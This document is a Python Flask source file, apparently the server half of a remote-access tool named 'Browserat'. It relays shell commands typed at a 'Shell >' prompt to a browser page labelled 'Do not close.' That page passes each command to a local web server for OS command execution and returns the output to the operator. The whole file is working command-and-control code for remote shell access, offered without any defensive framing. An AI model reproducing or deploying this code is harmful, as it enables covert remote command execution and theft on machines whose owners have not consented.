# -*- coding: utf-8 -*-
#!/bin/usr/python
from flask import Flask
from flask import request
import logging
import base64
import threading
import os
import signal
from time import sleep
# Constants

LOCALHOST_ADDRESS = "http://localhost:8899/do" #Browserat client-side web-server for OS command execution


# Main definitions
app = Flask(__name__)
ctx = app.app_context()
ctx.push()
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


#Globals & Flags
command = ""

# Server functions
def run_server():
	global app
	app.run(host='0.0.0.0', port=80, threaded=True,debug=False, use_reloader=False)

# Web-Server routes
@app.route("/control/controller")
def controller():
	return """<meta charset="UTF-8">
<h1>Do not close.</h1>
<script src="/static/jquery-3.0.0.min.js"></script><div class=command></div><br><div class=result></div><div class=sent></div>
<script>
var cmd = "";

function execute () {
	$.post(\"""" + LOCALHOST_ADDRESS + """",{'c' : encodeURI(cmd) }, function( data ) {
		var b64d = data;
		var b64c = cmd;
		$( ".result" ).html( "Output obtained.");
		$.post("/control/output", {'command' : encodeURI(b64c), 'output': encodeURI(b64d)}, function() {$( ".sent" ).html( "Output sent for " + cmd);} );
	});
}

setInterval(function() {
	$.get("/control/command", function( data ) {
		var new_cmd = data;
		if (new_cmd != "") {
			$( ".command" ).html( "Execution complete" );
			cmd = new_cmd ;
			execute();
		}
	});}
, 500);
</script>"""


# Issues commands to agent (commands issued by prompt)
@app.route("/control/command")
def disp_command():
	global command
	output = command
	command = ""
	return output

# Captures command output from agent
@app.route("/control/output", methods=['POST'])
def output():
	if request.method == 'POST':
		#clear_cli_stdout()
		try:
			raw_output = base64.b64decode(request.form['output']).replace('\x00'.encode(),''.encode())
			output = raw_output.decode('utf-8').strip()
			print(output)
			raw_output = ""
			command = ""
		except Exception as e:
			pass

	return "<H1>It works!</H1>"

# Clear prompt if printing to screen
def clear_cli_stdout():
	CURSOR_UP_ONE = '\x1b[1A'
	ERASE_LINE = '\x1b[2K'
	print(CURSOR_UP_ONE + ERASE_LINE)


# Main
if __name__ == "__main__":
	server_proc = threading.Thread(target=run_server)
	server_proc.start()
	# Title+Help
	try:
		# CLI Loop
		while (True):
			sleep(1)
			print()
			usercommand = input("Shell > ")
			command = base64.b64encode(usercommand.encode())

	except KeyboardInterrupt:
		print('\r\nExitting...\r\n')
		os.kill(os.getpid(), signal.SIGTERM) #Flask is great, but its documented method for shutdown is broken when threads are involved
